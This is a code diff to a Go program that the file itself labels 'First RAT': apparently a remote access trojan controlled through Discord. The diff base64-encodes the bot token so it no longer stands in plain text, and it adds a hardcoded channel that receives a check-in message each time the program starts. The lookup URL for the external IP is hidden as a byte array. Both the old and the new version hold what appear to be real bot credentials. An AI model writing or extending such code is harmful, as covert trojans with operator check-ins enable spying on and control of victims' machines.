@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/base64"
 	"fmt"
 	"net/http"
 	"os"
@@ -14,19 +15,24 @@ import (
 
 // Variables used for command line parameters
 var (
-	Token  = "MTExOTE4MTMwMDUxMTgwMTQyNA.Grl4kV.9Inl7z7n4AaUryG0VmmRFc1-3EFoBsp0aZMCIU"
+	Token  = "TVRFeE9URTRNVE13TURVeE1UZ3dNVFF5TkEuRzVMSDNKLmFsOUxObzM2MDhtUUZXaG1zakVVY3VJNC1OWkNhZHoyby1KTGxN"
 	Prefix = "$"
 	IP_API = []byte{104, 116, 116, 112, 58, 47, 47, 97, 112, 105, 46, 105, 112, 105, 102, 121, 46, 111, 114, 103}
 
 	// IP API request counter.
 	// This is used for checking if the MAX_REQ_ATTEMPTS has been reached.
 	RequestsToAPI int
+	BaseChannelID = "1114926685826076713"
 )
 
 func main() {
-
 	// Create a new Discord session using the provided bot token.
-	dg, err := discordgo.New("Bot " + Token)
+	rawDecodedToken, err := base64.StdEncoding.DecodeString(Token)
+	if err != nil {
+		fmt.Println("error decoding token,", err)
+		return
+	}
+	dg, err := discordgo.New("Bot " + string(rawDecodedToken))
 	if err != nil {
 		fmt.Println("error creating Discord session,", err)
 		return
@@ -58,6 +64,7 @@ func main() {
 
 func onReady(s *discordgo.Session, event *discordgo.Ready) {
 	s.UpdateListeningStatus("First RAT")
+	s.ChannelMessageSend(BaseChannelID, "Bot is now running.  Press CTRL-C to exit.")
 }
 
 func GetExternalIP() string {
